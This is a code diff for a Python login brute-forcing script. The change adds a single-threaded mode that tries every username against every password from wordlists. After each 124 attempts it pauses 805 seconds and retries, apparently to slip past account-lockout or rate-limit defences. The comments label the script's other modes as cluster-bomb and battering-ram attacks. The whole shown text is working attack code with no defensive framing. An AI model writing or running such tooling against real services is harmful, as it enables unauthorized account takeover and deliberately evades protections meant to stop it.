@@ -69,9 +69,22 @@ def choose_mode(mode: int):
             dic_password.pop(0)
             t.start()
             time.sleep(0.005)
+    elif mode == 4:
+        i = 0
+        for username in dic_username:
+            for password in dic_password:
+                brute(session, username, password)
+                time.sleep(0.005)
+                i = i + 1
+                if i == 124:
+                    tmp = password
+                    i = 0
+                    time.sleep(805)
+                    brute(session, username, tmp)
 
 
 if __name__ == '__main__':
     # mode=1,2:cluster bomb
     # mode=3:battering ram
-    choose_mode(1)
+    # mode=4:single thread
+    choose_mode(4)
